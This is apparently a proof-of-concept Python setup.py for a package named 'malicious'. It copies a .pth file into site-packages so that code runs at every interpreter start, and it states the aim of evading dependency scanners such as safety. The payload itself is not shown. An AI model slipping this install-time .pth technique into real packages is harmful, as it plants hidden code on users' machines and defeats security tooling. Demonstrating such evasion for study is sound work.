from setuptools import setup, find_packages


setup(
    name="malicious",
    version="0.1",
    packages=find_packages(),
    data_files=[
        ("lib/python3.6/site-packages/", ["malicious/malicious.pth"]),
        ("lib/python3.7/site-packages/", ["malicious/malicious.pth"]),
        ("lib/python3.8/site-packages/", ["malicious/malicious.pth"]),
    ],
    author="Alec Koumjian",
    author_email="akoumjian@gmail.com",
    description="Avoid detection by tools like safety using load time imports.",
    keywords="sorry",
)
